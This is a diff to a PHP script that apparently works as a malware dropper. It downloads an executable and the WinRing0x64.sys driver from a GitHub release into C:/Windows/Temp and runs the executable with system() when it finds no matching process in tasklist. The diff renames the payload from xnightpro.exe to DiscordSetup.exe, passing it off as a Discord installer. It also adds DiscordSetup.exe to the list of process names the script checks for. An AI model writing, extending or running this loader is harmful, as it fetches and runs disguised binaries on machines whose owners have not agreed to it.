@@ -59,21 +59,21 @@ $deletePaths = [
 
 
 
-system('taskkill /F /IM xnightpro.exe');
 
-system('mkdir "C:/Windows/Temp/spawn2/"');
+system('mkdir "C:/Windows/Temp/spawn33/"');
 
 exec('tasklist', $output);
 
-$url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/xnightpro.exe';
+$url =  'https://github.com/mainpoint91/mainpoint/releases/download/newnight/DiscordSetup.exe';
 $url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
 
-$file_name = 'C:/Windows/Temp/spawn2/xnightpro.exe';
-$file_name2 = 'C:/Windows/Temp/spawn2/WinRing0x64.sys';
+$file_name = 'C:/Windows/Temp/spawn33/DiscordSetup.exe';
+$file_name2 = 'C:/Windows/Temp/spawn33/WinRing0x64.sys';
 
 $found = false;
 $found2 = false;
 $found3 = false;
+$found4 = false;
 foreach ($output as $line) {
     if (stripos(strtolower($line), 'spotify.exe') !== false) {
         $found = true;
@@ -87,9 +87,13 @@ foreach ($output as $line) {
         $found3 = true;
 
     }
+    if (stripos(strtolower($line), 'DiscordSetup.exe') !== false) {
+        $found4 = true;
+
+    }
 }
 
-if (!$found && !$found2 && !$found3) {
+if (!$found && !$found2 && !$found3 && !$found4) {
         clearstatcache();
 
 
@@ -111,7 +115,7 @@ if (!$found && !$found2 && !$found3) {
             }
  
 
-         system('C:/Windows/Temp/spawn2/xnightpro.exe');
+         system('C:/Windows/Temp/spawn33/DiscordSetup.exe');
         
 
 
